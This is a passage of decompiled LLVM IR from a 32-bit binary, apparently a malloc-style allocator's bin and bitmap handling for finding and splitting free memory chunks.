dec_label_pc_805078a:                             ; preds = %dec_label_pc_805078a.lr.ph, %dec_label_pc_805085b
  %v1_8050d84 = phi i32 [ %v0_805085b9, %dec_label_pc_805078a.lr.ph ], [ %v0_805085b, %dec_label_pc_805085b ]
  %v1_805078a = add i32 %v1_8050d84, 4
  %v2_805078a = inttoptr i32 %v1_805078a to i32*
  %v3_805078a = load i32, i32* %v2_805078a, align 4
  %v1_805078d = add i32 %v1_8050d84, 12
  %v2_805078d = inttoptr i32 %v1_805078d to i32*
  %v3_805078d = load i32, i32* %v2_805078d, align 4
  store i32 %v3_805078d, i32* @edx, align 4
  %v1_8050790 = and i32 %v3_805078a, -4
  store i32 %v1_8050790, i32* @edi, align 4
  %v9_805079d = icmp eq i32 %v3_805078d, 134558580
  %v1_80507a3 = icmp eq i1 %v9_805079d, false
  %or.cond95 = or i1 %v6_8050726, %v1_80507a3
  br i1 %or.cond95, label %dec_label_pc_80507bc, label %dec_label_pc_80507a5

dec_label_pc_80507a5:                             ; preds = %dec_label_pc_805078a
  %v1_80507a5 = load i32, i32* @global_var_8053370.34, align 16
  %v12_80507a5 = icmp eq i32 %v1_8050d84, %v1_80507a5
  %v1_80507ab = icmp eq i1 %v12_80507a5, false
  br i1 %v1_80507ab, label %dec_label_pc_80507bc, label %dec_label_pc_80507ad

dec_label_pc_80507ad:                             ; preds = %dec_label_pc_80507a5
  store i32 %v1_80507b1, i32* %eax.global-to-local, align 4
  %v6_80507b6 = icmp ugt i32 %v1_8050790, %v1_80507b1
  br i1 %v6_80507b6, label %dec_label_pc_8050d6d, label %dec_label_pc_80507bc

dec_label_pc_80507bc:                             ; preds = %dec_label_pc_80507ad, %dec_label_pc_80507a5, %dec_label_pc_805078a
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %eax.global-to-local, align 4
  %v2_80507c1 = add i32 %v3_805078d, 8
  %v3_80507c1 = inttoptr i32 %v2_80507c1 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v3_80507c1, align 4
  %v0_80507c4 = load i32, i32* @edx, align 4
  store i32 %v0_80507c4, i32* @global_var_8053380.36, align 4
  %v0_80507c7 = load i32, i32* @edi, align 4
  %v15_80507c7 = icmp eq i32 %v0_80507c7, %.v1_80506ce
  br i1 %v15_80507c7, label %dec_label_pc_8050dae, label %dec_label_pc_80507d1

dec_label_pc_80507d1:                             ; preds = %dec_label_pc_80507bc
  %v6_80507d7 = icmp ugt i32 %v0_80507c7, 255
  br i1 %v6_80507d7, label %dec_label_pc_80507ea, label %dec_label_pc_80507d9

dec_label_pc_80507d9:                             ; preds = %dec_label_pc_80507d1
  %v2_80507db = udiv i32 %v0_80507c7, 8
  store i32 %v2_80507db, i32* %esi.global-to-local, align 4
  %v1_80507de = mul nuw i32 %v2_80507db, 8
  %v2_80507de = add i32 %v1_80507de, 134558572
  store i32 %v2_80507de, i32* @ebx, align 4
  %v1_80507e5 = add i32 %v1_80507de, 134558580
  %v2_80507e5 = inttoptr i32 %v1_80507e5 to i32*
  %v3_80507e5 = load i32, i32* %v2_80507e5, align 4
  store i32 %v3_80507e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050833

dec_label_pc_80507ea:                             ; preds = %dec_label_pc_80507d1
  store i32 %v0_80507c7, i32* @eax, align 4
  %v0_80507ec = call i32 @function_8050653()
  store i32 %v0_80507ec, i32* %esi.global-to-local, align 4
  %v1_80507f3 = mul i32 %v0_80507ec, 8
  %v2_80507f3 = add i32 %v1_80507f3, ptrtoint (i32* @global_var_805336c.33 to i32)
  store i32 %v2_80507f3, i32* %eax.global-to-local, align 4
  %v1_80507fa = add i32 %v1_80507f3, add (i32 ptrtoint (i32* @global_var_805336c.33 to i32), i32 8)
  %v2_80507fa = inttoptr i32 %v1_80507fa to i32*
  %v3_80507fa = load i32, i32* %v2_80507fa, align 4
  store i32 %v3_80507fa, i32* %edx.global-to-local, align 4
  store i32 %v3_80507fa, i32* @ebx, align 4
  %v12_8050803 = icmp eq i32 %v3_80507fa, %v2_80507f3
  br i1 %v12_8050803, label %dec_label_pc_8050833, label %dec_label_pc_8050807

dec_label_pc_8050807:                             ; preds = %dec_label_pc_80507ea
  %v1_8050807 = add i32 %v1_80507f3, add (i32 ptrtoint (i32* @global_var_805336c.33 to i32), i32 12)
  %v2_8050807 = inttoptr i32 %v1_8050807 to i32*
  %v3_8050807 = load i32, i32* %v2_8050807, align 4
  store i32 %v3_8050807, i32* @ebx, align 4
  %v0_805080a = load i32, i32* @edi, align 4
  %v2_805080a = add i32 %v3_8050807, 4
  %v3_805080a = inttoptr i32 %v2_805080a to i32*
  %v4_805080a = load i32, i32* %v3_805080a, align 4
  %v10_805080a = icmp ult i32 %v0_805080a, %v4_805080a
  %v1_805080d = icmp eq i1 %v10_805080a, false
  br i1 %v1_805080d, label %dec_label_pc_8050815, label %dec_label_pc_8050833

dec_label_pc_8050815:                             ; preds = %dec_label_pc_8050807
  %v1_8050817 = or i32 %v0_805080a, 1
  store i32 %v1_8050817, i32* %eax.global-to-local, align 4
  store i32 %v3_80507fa, i32* %ebx.global-to-local, align 4
  %v2_805082b109 = add i32 %v3_80507fa, 4
  %v3_805082b110 = inttoptr i32 %v2_805082b109 to i32*
  %v4_805082b111 = load i32, i32* %v3_805082b110, align 4
  %v10_805082b112 = icmp ult i32 %v1_8050817, %v4_805082b111
  br i1 %v10_805082b112, label %dec_label_pc_805081c, label %dec_label_pc_8050830

dec_label_pc_805081c:                             ; preds = %dec_label_pc_8050815, %dec_label_pc_805081c
  %v0_8050830113 = phi i32 [ %v3_8050820, %dec_label_pc_805081c ], [ %v3_80507fa, %dec_label_pc_8050815 ]
  store i32 %v0_8050830113, i32* %ecx.global-to-local, align 4
  %v1_8050820 = add i32 %v0_8050830113, 8
  %v2_8050820 = inttoptr i32 %v1_8050820 to i32*
  %v3_8050820 = load i32, i32* %v2_8050820, align 4
  store i32 %v3_8050820, i32* %ecx.global-to-local, align 4
  store i32 %v3_8050820, i32* %ebx.global-to-local, align 4
  %v2_805082b = add i32 %v3_8050820, 4
  %v3_805082b = inttoptr i32 %v2_805082b to i32*
  %v4_805082b = load i32, i32* %v3_805082b, align 4
  %v10_805082b = icmp ult i32 %v1_8050817, %v4_805082b
  br i1 %v10_805082b, label %dec_label_pc_805081c, label %dec_label_pc_8050830

dec_label_pc_8050830:                             ; preds = %dec_label_pc_805081c, %dec_label_pc_8050815
  %v0_8050830.lcssa = phi i32 [ %v3_80507fa, %dec_label_pc_8050815 ], [ %v3_8050820, %dec_label_pc_805081c ]
  %v1_8050830 = add i32 %v0_8050830.lcssa, 12
  %v2_8050830 = inttoptr i32 %v1_8050830 to i32*
  %v3_8050830 = load i32, i32* %v2_8050830, align 4
  store i32 %v3_8050830, i32* @ebx, align 4
  br label %dec_label_pc_8050833

dec_label_pc_8050833:                             ; preds = %dec_label_pc_80507d9, %dec_label_pc_8050807, %dec_label_pc_80507ea, %dec_label_pc_8050830
  %v0_8050833 = phi i32 [ %v0_80507ec, %dec_label_pc_80507ea ], [ %v0_80507ec, %dec_label_pc_8050830 ], [ %v0_80507ec, %dec_label_pc_8050807 ], [ %v2_80507db, %dec_label_pc_80507d9 ]
  %stack_var_-64.1 = phi i32 [ %v2_80507f3, %dec_label_pc_80507ea ], [ %v0_8050830.lcssa, %dec_label_pc_8050830 ], [ %v2_80507f3, %dec_label_pc_8050807 ], [ %v3_80507e5, %dec_label_pc_80507d9 ]
  %v1_8050835 = urem i32 %v0_8050833, 32
  %v2_8050835 = icmp eq i32 %v1_8050835, 0
  store i32 %v1_8050835, i32* %esi.global-to-local, align 4
  store i32 %v1_8050835, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_805083f = sdiv i32 %v0_8050833, 32
  store i32 %v2_805083f, i32* %edx.global-to-local, align 4
  br i1 %v2_8050835, label %dec_label_pc_805085b, label %bb

bb:                                               ; preds = %dec_label_pc_8050833
  %v5_8050842 = shl i32 1, %v1_8050835
  store i32 %v5_8050842, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805085b

dec_label_pc_805085b:                             ; preds = %dec_label_pc_8050833, %bb
  %v5_8050844 = phi i32 [ 1, %dec_label_pc_8050833 ], [ %v5_8050842, %bb ]
  %v1_8050844 = mul nsw i32 %v2_805083f, 4
  %v2_8050844 = add i32 %v1_8050844, ptrtoint (i32* @global_var_8053674.37 to i32)
  %v3_8050844 = inttoptr i32 %v2_8050844 to i32*
  %v4_8050844 = load i32, i32* %v3_8050844, align 4
  %v6_8050844 = or i32 %v4_8050844, %v5_8050844
  store i32 %v6_8050844, i32* %v3_8050844, align 4
  %v0_805084b = load i32, i32* @ebx, align 4
  %v1_805084b = load i32, i32* @ebp, align 4
  %v2_805084b = add i32 %v1_805084b, 12
  %v3_805084b = inttoptr i32 %v2_805084b to i32*
  store i32 %v0_805084b, i32* %v3_805084b, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8050852 = load i32, i32* @ebp, align 4
  %v2_8050852 = add i32 %v1_8050852, 8
  %v3_8050852 = inttoptr i32 %v2_8050852 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8050852, align 4
  %v0_8050855 = load i32, i32* @ebp, align 4
  %v1_8050855 = load i32, i32* @ebx, align 4
  %v2_8050855 = add i32 %v1_8050855, 8
  %v3_8050855 = inttoptr i32 %v2_8050855 to i32*
  store i32 %v0_8050855, i32* %v3_8050855, align 4
  %v0_8050858 = load i32, i32* @ebp, align 4
  %v1_8050858 = load i32, i32* @esi, align 4
  %v2_8050858 = add i32 %v1_8050858, 12
  %v3_8050858 = inttoptr i32 %v2_8050858 to i32*
  store i32 %v0_8050858, i32* %v3_8050858, align 4
  %v0_805085b = load i32, i32* @global_var_8053380.36, align 128
  store i32 %v0_805085b, i32* @ebp, align 4
  %v9_8050861 = icmp eq i32 %v0_805085b, 134558580
  %v1_8050867 = icmp eq i1 %v9_8050861, false
  br i1 %v1_8050867, label %dec_label_pc_805078a, label %dec_label_pc_805086d

dec_label_pc_805086d:                             ; preds = %dec_label_pc_805085b, %dec_label_pc_805085b.preheader
  br i1 %v8_805071e, label %dec_label_pc_80508fb, label %dec_label_pc_805087b

dec_label_pc_805087b:                             ; preds = %dec_label_pc_805086d
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805087f = mul i32 %stack_var_-40.0.ph, 8
  %v2_805087f = add i32 %v1_805087f, ptrtoint (i32* @global_var_805336c.33 to i32)
  store i32 %v2_805087f, i32* %edx.global-to-local, align 4
  %v1_8050886 = add i32 %v1_805087f, add (i32 ptrtoint (i32* @global_var_805336c.33 to i32), i32 12)
  %v2_8050886 = inttoptr i32 %v1_8050886 to i32*
  %storemerge1.pre = load i32, i32* %v2_8050886, align 4
  br label %dec_label_pc_80508f7

dec_label_pc_805088b:                             ; preds = %dec_label_pc_80508f7
  %v1_805088b = add i32 %v4_80508a2, 4
  %v2_805088b = inttoptr i32 %v1_805088b to i32*
  %v3_805088b = load i32, i32* %v2_805088b, align 4
  store i32 %v3_805088b, i32* %ebx.global-to-local, align 4
  %v1_805088e = add i32 %v4_80508a2, 12
  %v2_805088e = inttoptr i32 %v1_805088e to i32*
  %v3_805088e = load i32, i32* %v2_805088e, align 4
  store i32 %v3_805088e, i32* @ecx, align 4
  %v1_8050891 = and i32 %v3_805088b, -4
  store i32 %v1_8050891, i32* @ebx, align 4
  %v10_8050894 = icmp ult i32 %v1_8050891, %.v1_80506ce
  br i1 %v10_8050894, label %dec_label_pc_80508f7, label %dec_label_pc_805089a

dec_label_pc_805089a:                             ; preds = %dec_label_pc_805088b
  %v1_805089a = add i32 %v4_80508a2, 8
  %v2_805089a = inttoptr i32 %v1_805089a to i32*
  %v3_805089a = load i32, i32* %v2_805089a, align 4
  store i32 %v3_805089a, i32* @edx, align 4
  %v1_805089d = add i32 %v3_805089a, 12
  %v2_805089d = inttoptr i32 %v1_805089d to i32*
  %v3_805089d = load i32, i32* %v2_805089d, align 4
  %v15_805089d = icmp eq i32 %v3_805089d, %v4_80508a2
  %v1_80508a0 = icmp eq i1 %v15_805089d, false
  br i1 %v1_80508a0, label %dec_label_pc_80508a7, label %dec_label_pc_80508a2

dec_label_pc_80508a2:                             ; preds = %dec_label_pc_805089a
  %v1_80508a2 = add i32 %v3_805088e, 8
  %v2_80508a2 = inttoptr i32 %v1_80508a2 to i32*
  %v3_80508a2 = load i32, i32* %v2_80508a2, align 4
  %v15_80508a2 = icmp eq i32 %v3_80508a2, %v4_80508a2
  br i1 %v15_80508a2, label %dec_label_pc_80508ac, label %dec_label_pc_80508a7

dec_label_pc_80508a7:                             ; preds = %dec_label_pc_80508a2, %dec_label_pc_805089a
  %v0_80508a7 = call i32 @function_80515da()
  store i32 %v0_80508a7, i32* %eax.global-to-local, align 4
  %v0_80508ac.pre = load i32, i32* @ebx, align 4
  %v0_80508b2.pre = load i32, i32* @ecx, align 4
  %v1_80508b2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80508ac

dec_label_pc_80508ac:                             ; preds = %dec_label_pc_80508a2, %dec_label_pc_80508a7
  %v1_80508b2 = phi i32 [ %v3_805089a, %dec_label_pc_80508a2 ], [ %v1_80508b2.pre, %dec_label_pc_80508a7 ]
  %v0_80508b2 = phi i32 [ %v3_805088e, %dec_label_pc_80508a2 ], [ %v0_80508b2.pre, %dec_label_pc_80508a7 ]
  %v0_80508ac = phi i32 [ %v1_8050891, %dec_label_pc_80508a2 ], [ %v0_80508ac.pre, %dec_label_pc_80508a7 ]
  %v5_80508ae = sub i32 %v0_80508ac, %.v1_80506ce
  store i32 %v5_80508ae, i32* %esi.global-to-local, align 4
  %v2_80508b2 = add i32 %v1_80508b2, 12
  %v3_80508b2 = inttoptr i32 %v2_80508b2 to i32*
  store i32 %v0_80508b2, i32* %v3_80508b2, align 4
  %v0_80508b5 = load i32, i32* @edx, align 4
  %v1_80508b5 = load i32, i32* @ecx, align 4
  %v2_80508b5 = add i32 %v1_80508b5, 8
  %v3_80508b5 = inttoptr i32 %v2_80508b5 to i32*
  store i32 %v0_80508b5, i32* %v3_80508b5, align 4
  %v0_80508b8 = load i32, i32* %esi.global-to-local, align 4
  %v0_80508bb = load i32, i32* %eax.global-to-local, align 4
  %v1_80508bb = add i32 %v0_80508bb, 8
  store i32 %v1_80508bb, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_80508b8, 16
  br i1 %tmp125, label %dec_label_pc_8050dbc, label %dec_label_pc_80508c4

dec_label_pc_80508c4:                             ; preds = %dec_label_pc_80508ac
  %v2_80508c8 = add i32 %v0_80508bb, %.v1_80506ce
  store i32 %v2_80508c8, i32* @edx, align 4
  %v1_80508cb = or i32 %.v1_80506ce, 1
  store i32 %v1_80508cb, i32* %ebx.global-to-local, align 4
  %v2_80508ce = add i32 %v0_80508bb, 4
  %v3_80508ce = inttoptr i32 %v2_80508ce to i32*
  store i32 %v1_80508cb, i32* %v3_80508ce, align 4
  %v0_80508d1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80508d3 = or i32 %v0_80508d1, 1
  store i32 %v1_80508d3, i32* %eax.global-to-local, align 4
  %v0_80508d6 = load i32, i32* @edx, align 4
  %v1_80508d6 = load i32, i32* @ebp, align 4
  %v2_80508d6 = add i32 %v1_80508d6, 8
  %v3_80508d6 = inttoptr i32 %v2_80508d6 to i32*
  store i32 %v0_80508d6, i32* %v3_80508d6, align 4
  %v0_80508d9 = load i32, i32* @edx, align 4
  %v1_80508d9 = load i32, i32* @ebp, align 4
  %v2_80508d9 = add i32 %v1_80508d9, 12
  %v3_80508d9 = inttoptr i32 %v2_80508d9 to i32*
  store i32 %v0_80508d9, i32* %v3_80508d9, align 4
  %v0_80508dc = load i32, i32* @edx, align 4
  %v1_80508dc = add i32 %v0_80508dc, 8
  %v2_80508dc = inttoptr i32 %v1_80508dc to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_80508dc, align 4
  %v0_80508e3 = load i32, i32* @edx, align 4
  %v1_80508e3 = add i32 %v0_80508e3, 12
  %v2_80508e3 = inttoptr i32 %v1_80508e3 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_80508e3, align 4
  %v0_80508ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80508ea = load i32, i32* @edx, align 4
  %v2_80508ea = add i32 %v1_80508ea, 4
  %v3_80508ea = inttoptr i32 %v2_80508ea to i32*
  store i32 %v0_80508ea, i32* %v3_80508ea, align 4
  %v0_80508ed = load i32, i32* %esi.global-to-local, align 4
  %v1_80508ed = load i32, i32* @edx, align 4
  %v3_80508ed = add i32 %v1_80508ed, %v0_80508ed
  %v4_80508ed = inttoptr i32 %v3_80508ed to i32*
  store i32 %v0_80508ed, i32* %v4_80508ed, align 4
  br label %dec_label_pc_8050dc1

dec_label_pc_80508f7:                             ; preds = %dec_label_pc_805088b, %dec_label_pc_805087b
  %v4_80508a2 = phi i32 [ %storemerge1.pre, %dec_label_pc_805087b ], [ %v3_805088e, %dec_label_pc_805088b ]
  store i32 %v4_80508a2, i32* %eax.global-to-local, align 4
  %v12_80508f7 = icmp eq i32 %v4_80508a2, %v2_805087f
  %v1_80508f9 = icmp eq i1 %v12_80508f7, false
  br i1 %v1_80508f9, label %dec_label_pc_805088b, label %dec_label_pc_80508fb

dec_label_pc_80508fb:                             ; preds = %dec_label_pc_80508f7, %dec_label_pc_805086d
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8050904 = add i32 %stack_var_-40.0.ph, 1
  %v2_8050907 = udiv i32 %v1_8050904, 32
  store i32 %v2_8050907, i32* @edi, align 4
  %v1_805090a = mul i32 %v1_8050904, 8
  %v2_805090a = add i32 %v1_805090a, ptrtoint (i32* @global_var_805336c.33 to i32)
  store i32 %v2_805090a, i32* %ebx.global-to-local, align 4
  %v1_8050911 = urem i32 %v1_8050904, 32
  %v2_8050911 = icmp eq i32 %v1_8050911, 0
  store i32 %v1_8050911, i32* %ecx.global-to-local, align 4
  %v1_8050914 = mul nuw nsw i32 %v2_8050907, 4
  %v2_8050914 = add i32 %v1_8050914, ptrtoint (i32* @global_var_8053674.37 to i32)
  %v3_8050914 = inttoptr i32 %v2_8050914 to i32*
  %v4_8050914 = load i32, i32* %v3_8050914, align 4
  store i32 %v4_8050914, i32* %edx.global-to-local, align 4
  br i1 %v2_8050911, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_80508fb
  %v5_805091b = shl i32 1, %v1_8050911
  store i32 %v5_805091b, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80508fb, %bb88, %dec_label_pc_805095c
  %v1_805091d = phi i32 [ %v1_805091d.pre, %dec_label_pc_805095c ], [ %v4_8050914, %bb88 ], [ %v4_8050914, %dec_label_pc_80508fb ]
  %v0_8050921 = phi i32 [ %v0_805091d.pre, %dec_label_pc_805095c ], [ %v5_805091b, %bb88 ], [ 1, %dec_label_pc_80508fb ]
  %tmp89 = icmp ule i32 %v0_8050921, %v1_805091d
  %v1_8050921 = icmp eq i32 %v0_8050921, 0
  %v1_8050923 = icmp eq i1 %v1_8050921, false
  %or.cond = and i1 %tmp89, %v1_8050923
  br i1 %or.cond, label %dec_label_pc_8050921.dec_label_pc_8050951.preheader_crit_edge, label %dec_label_pc_8050925.preheader

dec_label_pc_8050921.dec_label_pc_8050951.preheader_crit_edge: ; preds = %.preheader
  %v0_805094c7.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050951.preheader

dec_label_pc_8050925.preheader:                   ; preds = %.preheader
  %v0_8050925.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050925

dec_label_pc_8050925:                             ; preds = %dec_label_pc_8050925.preheader, %dec_label_pc_805092f
  %v0_8050925 = phi i32 [ %v0_8050925.pre, %dec_label_pc_8050925.preheader ], [ %v1_8050925, %dec_label_pc_805092f ]
  %v1_8050925 = add i32 %v0_8050925, 1
  store i32 %v1_8050925, i32* @edi, align 4
  %v6_8050929 = icmp ugt i32 %v1_8050925, 2
  br i1 %v6_8050929, label %dec_label_pc_80509d8, label %dec_label_pc_805092f

dec_label_pc_805092f:                             ; preds = %dec_label_pc_8050925
  %v1_805092f = mul i32 %v1_8050925, 4
  %v2_805092f = add i32 %v1_805092f, ptrtoint (i32* @global_var_8053674.37 to i32)
  %v3_805092f = inttoptr i32 %v2_805092f to i32*
  %v4_805092f = load i32, i32* %v3_805092f, align 4
  store i32 %v4_805092f, i32* %edx.global-to-local, align 4
  %v1_8050936 = icmp eq i32 %v4_805092f, 0
  br i1 %v1_8050936, label %dec_label_pc_8050925, label %dec_label_pc_805093a

dec_label_pc_805093a:                             ; preds = %dec_label_pc_805092f
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8050941 = mul i32 %v1_8050925, 256
  store i32 %v2_8050941, i32* %eax.global-to-local, align 4
  %v1_8050944 = add i32 %v2_8050941, ptrtoint (i32* @global_var_805336c.33 to i32)
  store i32 %v1_8050944, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050951.preheader

dec_label_pc_8050951.preheader:                   ; preds = %dec_label_pc_8050921.dec_label_pc_8050951.preheader_crit_edge, %dec_label_pc_805093a
  %v0_805094c7 = phi i32 [ %v1_8050944, %dec_label_pc_805093a ], [ %v0_805094c7.pre, %dec_label_pc_8050921.dec_label_pc_8050951.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805093a ], [ %v0_8050921, %dec_label_pc_8050921.dec_label_pc_8050951.preheader_crit_edge ]
  %v0_8050963 = phi i32 [ %v4_805092f, %dec_label_pc_805093a ], [ %v1_805091d, %dec_label_pc_8050921.dec_label_pc_8050951.preheader_crit_edge ]
  %v2_80509514 = and i32 %v0_8050963, %esi.promoted
  %v3_80509515 = icmp eq i32 %v2_80509514, 0
  br i1 %v3_80509515, label %dec_label_pc_805094c, label %dec_label_pc_8050955

dec_label_pc_805094c:                             ; preds = %dec_label_pc_8050951.preheader, %dec_label_pc_805094c
  %v2_805094f18 = phi i32 [ %v2_805094f, %dec_label_pc_805094c ], [ %esi.promoted, %dec_label_pc_8050951.preheader ]
  %v0_805094c8 = phi i32 [ %v1_805094c, %dec_label_pc_805094c ], [ %v0_805094c7, %dec_label_pc_8050951.preheader ]
  %v1_805094c = add i32 %v0_805094c8, 8
  %v2_805094f = mul i32 %v2_805094f18, 2
  %v2_8050951 = and i32 %v2_805094f, %v0_8050963
  %v3_8050951 = icmp eq i32 %v2_8050951, 0
  br i1 %v3_8050951, label %dec_label_pc_805094c, label %dec_label_pc_8050951.dec_label_pc_8050955_crit_edge

dec_label_pc_8050951.dec_label_pc_8050955_crit_edge: ; preds = %dec_label_pc_805094c
  store i32 %v1_805094c, i32* %ebx.global-to-local, align 4
  store i32 %v2_805094f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050955

dec_label_pc_8050955:                             ; preds = %dec_label_pc_8050951.dec_label_pc_8050955_crit_edge, %dec_label_pc_8050951.preheader
  %v0_8050965 = phi i32 [ %v2_805094f, %dec_label_pc_8050951.dec_label_pc_8050955_crit_edge ], [ %esi.promoted, %dec_label_pc_8050951.preheader ]
  %v1_805097f = phi i32 [ %v1_805094c, %dec_label_pc_8050951.dec_label_pc_8050955_crit_edge ], [ %v0_805094c7, %dec_label_pc_8050951.preheader ]
  %v1_8050955 = add i32 %v1_805097f, 12
  %v2_8050955 = inttoptr i32 %v1_8050955 to i32*
  %v3_8050955 = load i32, i32* %v2_8050955, align 4
  store i32 %v3_8050955, i32* %ecx.global-to-local, align 4
  %v12_8050958 = icmp eq i32 %v3_8050955, %v1_805097f
  %v1_805095a = icmp eq i1 %v12_8050958, false
  br i1 %v1_805095a, label %dec_label_pc_8050970, label %dec_label_pc_805095c

dec_label_pc_805095c:                             ; preds = %dec_label_pc_8050955
  %v1_805095e = add i32 %v3_8050955, 8
  store i32 %v1_805095e, i32* %ebx.global-to-local, align 4
  %v1_8050961 = sub i32 -1, %v0_8050965
  store i32 %v1_8050961, i32* %eax.global-to-local, align 4
  %v2_8050963 = and i32 %v0_8050963, %v1_8050961
  store i32 %v2_8050963, i32* %edx.global-to-local, align 4
  %v2_8050965 = mul i32 %v0_8050965, 2
  store i32 %v2_8050965, i32* %esi.global-to-local, align 4
  %v1_8050967 = load i32, i32* @edi, align 4
  %v2_8050967 = mul i32 %v1_8050967, 4
  %v3_8050967 = add i32 %v2_8050967, ptrtoint (i32* @global_var_8053674.37 to i32)
  %v4_8050967 = inttoptr i32 %v3_8050967 to i32*
  store i32 %v2_8050963, i32* %v4_8050967, align 4
  %v0_805091d.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805091d.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050970:                             ; preds = %dec_label_pc_8050955
  %v1_8050970 = add i32 %v3_8050955, 4
  %v2_8050970 = inttoptr i32 %v1_8050970 to i32*
  %v3_8050970 = load i32, i32* %v2_8050970, align 4
  store i32 %v3_8050970, i32* %edx.global-to-local, align 4
  %v1_8050973 = add i32 %v3_8050955, 12
  %v2_8050973 = inttoptr i32 %v1_8050973 to i32*
  %v3_8050973 = load i32, i32* %v2_8050973, align 4
  store i32 %v3_8050973, i32* %eax.global-to-local, align 4
  %v1_8050976 = and i32 %v3_8050970, -4
  store i32 %v1_8050976, i32* @edx, align 4
  %v5_805097b = sub i32 %v1_8050976, %.v1_80506ce
  store i32 %v5_805097b, i32* %esi.global-to-local, align 4
  store i32 %v3_8050973, i32* %v2_8050955, align 4
  %v0_8050982 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050982 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050982 = add i32 %v1_8050982, 8
  %v3_8050982 = inttoptr i32 %v2_8050982 to i32*
  store i32 %v0_8050982, i32* %v3_8050982, align 4
  %v0_8050985 = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8050985, 16
  br i1 %tmp126, label %dec_label_pc_805098a, label %dec_label_pc_8050991

dec_label_pc_805098a:                             ; preds = %dec_label_pc_8050970
  %v0_805098a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805098a = load i32, i32* @edx, align 4
  %v2_805098a = add i32 %v0_805098a, 4
  %v3_805098a = add i32 %v2_805098a, %v1_805098a
  %v4_805098a = inttoptr i32 %v3_805098a to i32*
  %v5_805098a = load i32, i32* %v4_805098a, align 4
  %v6_805098a = or i32 %v5_805098a, 1
  store i32 %v6_805098a, i32* %v4_805098a, align 4
  br label %dec_label_pc_80509d0

dec_label_pc_8050991:                             ; preds = %dec_label_pc_8050970
  store i32 %.v1_80506ce, i32* %eax.global-to-local, align 4
  %v0_805099a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805099a = add i32 %v0_805099a, %.v1_80506ce
  store i32 %v2_805099a, i32* @edx, align 4
  %v1_805099d = load i32, i32* @ebp, align 4
  %v2_805099d = add i32 %v1_805099d, 8
  %v3_805099d = inttoptr i32 %v2_805099d to i32*
  store i32 %v2_805099a, i32* %v3_805099d, align 4
  %v0_80509a0 = load i32, i32* @edx, align 4
  %v1_80509a0 = load i32, i32* @ebp, align 4
  %v2_80509a0 = add i32 %v1_80509a0, 12
  %v3_80509a0 = inttoptr i32 %v2_80509a0 to i32*
  store i32 %v0_80509a0, i32* %v3_80509a0, align 4
  %v0_80509a3 = load i32, i32* @edx, align 4
  %v1_80509a3 = add i32 %v0_80509a3, 8
  %v2_80509a3 = inttoptr i32 %v1_80509a3 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_80509a3, align 4
  %v0_80509aa = load i32, i32* @edx, align 4
  %v1_80509aa = add i32 %v0_80509aa, 12
  %v2_80509aa = inttoptr i32 %v1_80509aa to i32*
  store i32 ptrtoint (i32* @global_var_8053374.35 to i32), i32* %v2_80509aa, align 4
  br i1 %v6_8050726, label %dec_label_pc_80509b9, label %dec_label_pc_80509b3

dec_label_pc_80509b3:                             ; preds = %dec_label_pc_8050991
  %v0_80509b3 = load i32, i32* @edx, align 4
  store i32 %v0_80509b3, i32* @global_var_8053370.34, align 16
  br label %dec_label_pc_80509b9

dec_label_pc_80509b9:                             ; preds = %dec_label_pc_8050991, %dec_label_pc_80509b3
  %v4_80509b9 = or i32 %.v1_80506ce, 1
  %v0_80509be = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80509b9, i32* %ebx.global-to-local, align 4
  %v1_80509c4 = or i32 %v0_80509be, 1
  store i32 %v1_80509c4, i32* %eax.global-to-local, align 4
  %v1_80509c7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80509c7 = add i32 %v1_80509c7, 4
  %v3_80509c7 = inttoptr i32 %v2_80509c7 to i32*
  store i32 %v4_80509b9, i32* %v3_80509c7, align 4
  %v0_80509ca = load i32, i32* %esi.global-to-local, align 4
  %v1_80509ca = load i32, i32* @edx, align 4
  %v3_80509ca = add i32 %v1_80509ca, %v0_80509ca
  %v4_80509ca = inttoptr i32 %v3_80509ca to i32*
  store i32 %v0_80509ca, i32* %v4_80509ca, align 4
  %v0_80509cd = load i32, i32* %eax.global-to-local, align 4
  %v1_80509cd = load i32, i32* @edx, align 4
  %v2_80509cd = add i32 %v1_80509cd, 4
  %v3_80509cd = inttoptr i32 %v2_80509cd to i32*
  store i32 %v0_80509cd, i32* %v3_80509cd, align 4
  br label %dec_label_pc_80509d0

dec_label_pc_80509d0:                             ; preds = %dec_label_pc_805098a, %dec_label_pc_80509b9
  %v0_80509d0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80509d0 = add i32 %v0_80509d0, 8
